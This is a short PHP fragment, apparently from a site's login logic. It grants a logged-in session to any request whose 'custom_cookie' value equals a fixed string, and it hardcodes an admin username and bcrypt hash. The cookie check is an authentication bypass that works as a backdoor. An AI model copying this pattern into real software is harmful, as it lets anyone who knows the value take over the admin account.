...
if (!isset($_SESSION['loggedin']) && isset($_COOKIE['custom_cookie']) && $_COOKIE['custom_cookie'] === 'ndra') {
...
$username = "admin";
$passwordHash = '$2a$12$u0YWEgio2b6sii5I9WPQSuVzxtclBpigP3ZTGC4lbEET7Fn5QDWzu'; // Hash bcrypt
